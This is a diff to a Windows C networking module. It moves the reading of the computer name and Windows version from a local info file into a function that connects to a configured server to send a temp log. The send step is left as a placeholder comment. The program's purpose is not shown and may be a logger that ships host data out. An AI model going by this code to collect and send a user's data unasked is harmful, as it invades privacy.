@@ -7,9 +7,9 @@
 #include <stdio.h>
 #include <ws2tcpip.h>
 #include <iphlpapi.h>
-#include <stdio.h>
 
 #include "DataTypes.h"
+#include "ProcessData.h"
 
 #define SOCK_BUFLEN 512
 #define INFO_BUFLEN 32767
@@ -19,8 +19,65 @@ DWORD LittleToBig(DWORD in) {
 	return (in << 8 | in >> 8) & 0xffff;
 }
 
-DWORD WINAPI ConnectToServer(PCHAR pServerIP, DWORD dwPort) {
+DWORD WINAPI SendLogToServer(PCHAR pServerIP, DWORD dwPort) {
 
+	// === GETTING LOCAL SYSTEM INFORMATION === //
+	DWORD dwErrorCode, 
+		dwByteRead,
+		dwResult;
+
+	static PCHAR pComputerName = NULL, 
+		pWindowsVersion;
+
+	//Open System Infomatin File
+	LPCSTR pInfoFile = "Config/System.info";
+	HANDLE hInfoFile = CreateFileA(pInfoFile, GENERIC_READ, 0, 0, OPEN_EXISTING, 0, 0);
+	dwErrorCode = GetLastError();
+
+	//If file does not exist
+	if (dwErrorCode == ERROR_FILE_NOT_FOUND) {
+		_tprintf(L"Cannot open System Information file: ERROR_FILE_NOT_FOUND !\n");
+		return 1;
+	}
+
+	//Read from Info File
+	PCHAR pInfoBuffer = (PCHAR)calloc(MAX_BUFFER_LEN, sizeof(CHAR));
+	dwResult = ReadFile(hInfoFile, pInfoBuffer, MAX_BUFFER_LEN, &dwByteRead, NULL);
+
+	//Close File Handle
+	CloseHandle(hInfoFile);
+
+	// Check weather Config File contains NULL
+	if (dwByteRead == 0) {
+		_tprintf(L"System Information file contains NULL !\n");
+		return 1;
+	}
+
+	// Debug
+	printf("Debug Info file: %s\n", pInfoBuffer);
+
+	// Getting Computer Name 
+	pComputerName = ParseData(pInfoBuffer, "<ComputerName>");
+	if (pComputerName == NULL) {
+		printf("Computer Name was not set\n");
+		return 1;
+	}
+
+	// Debug
+	printf("Debug Computer Name:%s \n", pComputerName);
+
+	// Getting Windows Version
+
+	pWindowsVersion = ParseData(pInfoBuffer, "<WindowsVersion>");
+	if (pWindowsVersion == NULL) {
+		printf("Windows Version was not set\n");
+		return 1;
+	}
+
+	// Debug
+	printf("Debug WindowsVersion:%s \n", pWindowsVersion);
+
+	// CONNECTING TO SERVER FOR SENDING LOG
 	WSADATA wsaData;
 	SOCKET ConnectSocket = INVALID_SOCKET;
 	struct sockaddr_in sock;
@@ -41,8 +98,6 @@ DWORD WINAPI ConnectToServer(PCHAR pServerIP, DWORD dwPort) {
 		return 1;
 	}
 
-	//Conver Unicode address to UTF8 address
-
 	sock.sin_family = AF_INET;
 	sock.sin_port = LittleToBig(dwPort);
 	sock.sin_addr.s_addr = inet_addr(pServerIP);
@@ -55,6 +110,13 @@ DWORD WINAPI ConnectToServer(PCHAR pServerIP, DWORD dwPort) {
 	}
 
 	printf("Connected to Server at [%s:%d]\n", pServerIP, dwPort);
+
+	//Wait while tmpLogFile is available and read log to send
+
+
+	WSACleanup();
+
+	return 0;
 }
 
 
@@ -67,28 +129,6 @@ DWORD WINAPI Networking() {
 	DWORD dwResult, dwByteRead;
 	PCHAR pBuffer;
 	DWORD dwErrorCode;
-
-	// === GETTING LOCAL SYSTEM INFORMATION === //
-	//Open System Infomatin File
-	LPCSTR pInfoFile = "Config/System.info";
-	HANDLE hInfoFile = CreateFileA(pInfoFile, GENERIC_READ, 0, 0, OPEN_EXISTING, 0, 0);
-	dwErrorCode = GetLastError();
-
-	//If file does not exist
-	if (dwErrorCode == ERROR_FILE_NOT_FOUND) {
-		_tprintf(L"Cannot open System Information file: ERROR_FILE_NOT_FOUND !\n");
-		return 1;
-	}
-
-	//Read from Info File
-	PCHAR pInfoBuffer = (PCHAR)calloc(MAX_BUFFER_LEN, sizeof(CHAR));
-	dwResult = ReadFile(hInfoFile, pInfoBuffer, MAX_BUFFER_LEN, &dwByteRead, NULL);
-
-	// Check weather Config File contains NULL
-	if (dwByteRead == 0) {
-		_tprintf(L"System Information file contains NULL !\n");
-		return 1;
-	}
 
 	// === GETTING CONFIGURATION FOR NETWORKING AND CONNECT TO SERVER ===
 	//Open Configuration File for Network Connection
@@ -151,7 +191,7 @@ DWORD WINAPI Networking() {
 
 	//Connect to Server
 	printf("Connecting to [%s:%d]\n", pServerIP, dwPort);
-	ConnectToServer(pServerIP, dwPort);
+	SendLogToServer(pServerIP, dwPort);
 
 	_tprintf(L"Finish Successfully ! \n");
 }
